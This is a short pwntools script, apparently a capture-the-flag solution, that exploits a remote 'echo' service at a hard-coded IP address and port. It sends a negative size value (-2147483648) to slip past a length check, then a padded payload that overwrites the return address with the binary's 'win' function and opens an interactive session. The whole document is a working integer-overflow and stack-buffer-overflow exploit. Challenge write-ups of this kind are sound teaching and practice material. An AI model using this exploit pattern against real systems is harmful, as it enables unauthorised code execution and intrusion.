from pwn import *

elf = ELF("./echo")

p = remote("34.170.146.252", 48657)

p.sendlineafter(b"Size: ", b"-2147483648")

win_addr = elf.symbols["win"]

payload = b"a" * 0x118 + p64(win_addr)
p.sendlineafter(b"Data: ", payload)

p.interactive()
